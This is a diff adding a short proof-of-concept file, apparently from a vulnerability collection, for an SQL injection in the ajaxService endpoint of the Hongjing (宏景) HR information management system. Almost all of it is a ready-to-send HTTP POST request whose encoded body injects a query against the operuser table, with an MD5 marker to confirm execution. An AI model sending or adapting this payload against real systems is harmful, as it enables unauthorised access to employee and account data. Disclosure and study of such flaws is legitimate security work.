@@ -1,0 +1,7 @@
+# 宏景人力资源信息管理系统 ajaxService 存在SQL注入漏洞
+POST /ajax/ajaxService?_ZQA_ID={ZQA_ID} HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+
+__type=extTrans&__xml=%7B%22functionId%22%3A%22151211001137%22%2C%22sql%22%3A%22select~20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','dndnrnsnffjdnf'))~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser%22%2C%22nbase%22%3A%221%22%7D
